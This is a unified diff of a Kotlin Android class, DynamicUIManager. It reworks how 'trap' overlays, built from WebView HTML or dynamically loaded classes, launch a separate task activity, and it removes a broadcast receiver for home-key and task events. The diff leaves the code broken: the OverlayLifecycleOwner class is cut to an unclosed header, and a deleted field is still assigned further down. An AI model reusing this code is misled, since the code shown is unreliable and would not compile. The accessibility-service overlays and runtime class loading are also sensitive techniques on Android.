@@ -36,76 +36,9 @@ object DynamicUIManager {
     var isNativeAttached: Boolean = false
     private var activeNativeEntry: com.example.myandroid.dynamic.DynamicEntry? = null
 
-    private var nativeLifecycleOwner: OverlayLifecycleOwner? = null
-
-    var nativeAppMode = false
-    var nativeSessionId = ""
-    var htmlAppMode = false
-    var htmlSessionId = ""
-    private var isTaskReceiverRegistered = false
+    class OverlayLifecycleOwner : androidx.lifecycle.LifecycleOwner, androidx.lifecycle.ViewModelStoreOwner, androidx.savedstate.SavedStateRegistryOwner {
 
     var activeTrapSessionId = 0L
-    val isAnyAttached: Boolean get() = isAttached || isNativeAttached
-
-    private class OverlayLifecycleOwner : androidx.lifecycle.LifecycleOwner, androidx.lifecycle.ViewModelStoreOwner, androidx.savedstate.SavedStateRegistryOwner {
-        private val lifecycleRegistry = androidx.lifecycle.LifecycleRegistry(this)
-        private val savedStateRegistryController = androidx.savedstate.SavedStateRegistryController.create(this)
-        private val store = androidx.lifecycle.ViewModelStore()
-
-        override val lifecycle: androidx.lifecycle.Lifecycle get() = lifecycleRegistry
-        override val savedStateRegistry: androidx.savedstate.SavedStateRegistry get() = savedStateRegistryController.savedStateRegistry
-        override val viewModelStore: androidx.lifecycle.ViewModelStore get() = store
-
-        init {
-            savedStateRegistryController.performRestore(null)
-            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_CREATE)
-            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_START)
-            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_RESUME)
-        }
-
-        fun destroy() {
-            lifecycleRegistry.handleLifecycleEvent(androidx.lifecycle.Lifecycle.Event.ON_DESTROY)
-            store.clear()
-        }
-    }
-
-    private fun registerReceiverIfNeeded(ctx: Context) {
-        if (isTaskReceiverRegistered) return
-        val receiver = object : android.content.BroadcastReceiver() {
-            override fun onReceive(context: Context, intent: Intent) {
-                when (intent.action) {
-                    Intent.ACTION_CLOSE_SYSTEM_DIALOGS -> {
-                        val reason = intent.getStringExtra("reason")
-                        if (reason == "homekey" || reason == "recentapps") {
-                            if (nativeAppMode) nativeOverlayView?.visibility = android.view.View.GONE
-                            if (htmlAppMode) overlayView?.visibility = android.view.View.GONE
-                        }
-                    }
-                    "com.cortex.task.RESUME" -> {
-                        val sid = intent.getStringExtra("session_id")
-                        if (sid == nativeSessionId) nativeOverlayView?.visibility = android.view.View.VISIBLE
-                        if (sid == htmlSessionId) overlayView?.visibility = android.view.View.VISIBLE
-                    }
-                    "com.cortex.task.CLOSE" -> {
-                        val sid = intent.getStringExtra("session_id")
-                        if (sid == nativeSessionId) removeNativeOverlay(context, "TASK_SWIPED")
-                        if (sid == htmlSessionId) removeOverlay(context, "TASK_SWIPED")
-                    }
-                }
-            }
-        }
-        val filter = android.content.IntentFilter().apply {
-            addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)
-            addAction("com.cortex.task.RESUME")
-            addAction("com.cortex.task.CLOSE")
-        }
-        if (android.os.Build.VERSION.SDK_INT >= 33) {
-            ctx.applicationContext.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
-        } else {
-            ctx.applicationContext.registerReceiver(receiver, filter)
-        }
-        isTaskReceiverRegistered = true
-    }
 
     class CortexBridge(private val ctx: Context) {
         @JavascriptInterface
@@ -115,6 +48,7 @@ object DynamicUIManager {
                     .putBoolean("power_shield_keep_ignited", false).apply()
                 removeOverlay(ctx, "JS_BRIDGE_CLOSE") 
                 removeNativeOverlay(ctx, "JS_BRIDGE_CLOSE")
+                if (ctx is android.app.Activity) ctx.finish()
             }
         }
 
@@ -741,6 +675,17 @@ object DynamicUIManager {
                 return@post
             }
 
+            if (appMode) {
+                DimmerManager.removeOverlay(ctx)
+                DynamicAppHandoff.pendingHtml = htmlContent
+                val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
+                    putExtra("task_title", trapLabel)
+                }
+                ctx.startActivity(intent)
+                return@post
+            }
+
             val windowContext = if (finalMethod == "ACC") serviceInstance!! else ctx
             val wm = windowContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager
             val targetType = if (finalMethod == "ACC") WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY else WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
@@ -881,19 +826,6 @@ object DynamicUIManager {
                     wm.addView(overlayView, params)
                     currentType = targetType
                     isAttached = true
-                    
-                    htmlAppMode = appMode
-                    if (appMode) {
-                        htmlSessionId = java.util.UUID.randomUUID().toString()
-                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
-                            putExtra("task_title", trapLabel)
-                            putExtra("session_id", htmlSessionId)
-                        }
-                        ctx.startActivity(intent)
-                    }
-                    registerReceiverIfNeeded(ctx)
-                    
                     DebugLogger.log("SDUI_VERBOSE", "WebView attached successfully.")
                 } else {
                     overlayView!!.layoutParams = params
@@ -1135,6 +1067,18 @@ object DynamicUIManager {
                     val clazz = loader.loadClass(className)
                     val instance = clazz.getDeclaredConstructor().newInstance() as com.example.myandroid.dynamic.DynamicEntry
                     activeNativeEntry = instance
+
+                    if (appMode) {
+                        DimmerManager.removeOverlay(ctx)
+                        DynamicAppHandoff.pendingNativeEntry = instance
+                        DynamicAppHandoff.pendingNativeDir = trapDir.absolutePath
+                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
+                            putExtra("task_title", trapLabel)
+                        }
+                        ctx.startActivity(intent)
+                        return@postDelayed
+                    }
                     
                     val view = instance.getView(windowContext, CortexBridge(ctx), trapDir.absolutePath)
 
@@ -1169,18 +1113,6 @@ object DynamicUIManager {
                     nativeOverlayView = view
                     nativeLifecycleOwner = lifecycleOwner
                     isNativeAttached = true
-                    
-                    nativeAppMode = appMode
-                    if (appMode) {
-                        nativeSessionId = java.util.UUID.randomUUID().toString()
-                        val intent = Intent(ctx, DynamicTaskActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK)
-                            putExtra("task_title", trapLabel)
-                            putExtra("session_id", nativeSessionId)
-                        }
-                        ctx.startActivity(intent)
-                    }
-                    registerReceiverIfNeeded(ctx)
                     
                     // 4. LIFT DIM AND PURGE OLD UI (After new UI is rendered)
                     Handler(Looper.getMainLooper()).postDelayed({
